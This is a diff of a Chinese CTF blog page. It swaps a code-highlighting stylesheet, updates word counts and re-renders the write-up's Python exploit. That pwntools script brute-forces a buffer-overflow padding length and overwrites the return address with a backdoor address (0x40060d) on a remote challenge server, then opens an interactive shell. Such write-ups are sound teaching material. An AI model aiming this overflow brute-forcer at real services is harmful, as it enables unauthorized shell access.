@@ -34,7 +34,7 @@ from pwn import *
     </style>
 
     <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
-<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+<link rel="stylesheet" href="/css/prism-xonokai.css" type="text/css"></head>
 
 
 <body>
@@ -404,7 +404,7 @@ from pwn import *
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        246
+                        227
                     </div>
                     
 
@@ -432,35 +432,36 @@ from pwn import *
 <p>linux连接尝试：<br><img src="https://s1.ax1x.com/2020/05/23/YjviQJ.png" alt=""></p>
 <p>因为没有关键提示，可以从溢出方面下手，这个地址很可能就是后门。</p>
 <p>exp爆破：</p>
-<pre><code>from pwn import *
-#context.log_level = &#39;debug&#39;
-addr = 0x40060d    #地址可能是p32 也可能是p64
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token comment" spellcheck="true">#context.log_level = 'debug'</span>
+addr <span class="token operator">=</span> <span class="token number">0x40060d</span>    <span class="token comment" spellcheck="true">#地址可能是p32 也可能是p64</span>
 
-def fuzz(r, num, flag):    #爆破函数 , flag表示有3种可能：p32发送后门，p64发送后门，无效后门。
-    payload = &#39;a&#39; * num
-    if flag==1:
-        payload += p32(addr)
-    if flag==2:
-        payload += p64(addr)
-    r.recvuntil(&quot;&gt;&quot;)
-    r.sendline(payload)
+<span class="token keyword">def</span> <span class="token function">fuzz</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> num<span class="token punctuation">,</span> flag<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#爆破函数 , flag表示有3种可能：p32发送后门，p64发送后门，无效后门。</span>
+    payload <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> num
+    <span class="token keyword">if</span> flag<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>
+        payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> flag<span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">:</span>
+        payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">">"</span><span class="token punctuation">)</span>
+    r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
 
-def main():
-    for i in range(1000):  
-        print(i)
-        for j in range(3):
-            try:
-                r = remote(&quot;101.200.240.241&quot;, 7000)
-                fuzz(r, i, j)
-                text = r.recv()
-                print(&#39;text.len=&#39;+str(len(text))+&#39;text=&#39;+text)
-                print(&#39;num=&#39;+str(i)+&#39; flag=&#39;+str(j))
-                r.interactive()
-            except:            #except为空则try语句中出现任何错误都会执行r.close()
-                r.close()
+<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  
+        <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
+        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            <span class="token keyword">try</span><span class="token punctuation">:</span>
+                r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"101.200.240.241"</span><span class="token punctuation">,</span> <span class="token number">7000</span><span class="token punctuation">)</span>
+                fuzz<span class="token punctuation">(</span>r<span class="token punctuation">,</span> i<span class="token punctuation">,</span> j<span class="token punctuation">)</span>
+                text <span class="token operator">=</span> r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'text.len='</span><span class="token operator">+</span>str<span class="token punctuation">(</span>len<span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'text='</span><span class="token operator">+</span>text<span class="token punctuation">)</span>
+                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'num='</span><span class="token operator">+</span>str<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">' flag='</span><span class="token operator">+</span>str<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>
+                r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+            <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true">#except为空则try语句中出现任何错误都会执行r.close()</span>
+                r<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
 
-if __name__ == &#39;__main__&#39;:
-    main()</code></pre><p>对于循环脚本可用ctr + c 打断无法继续下去的一个循环进行下一个循环</p>
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    main<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<p>对于循环脚本可用ctr + c 打断无法继续下去的一个循环进行下一个循环</p>
 
             </div>
             <hr/>
@@ -807,7 +808,7 @@ if __name__ == &#39;__main__&#39;:
 
             
                 &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-                <span class="white-color">31.5k</span>
+                <span class="white-color">30k</span>
             
 
             
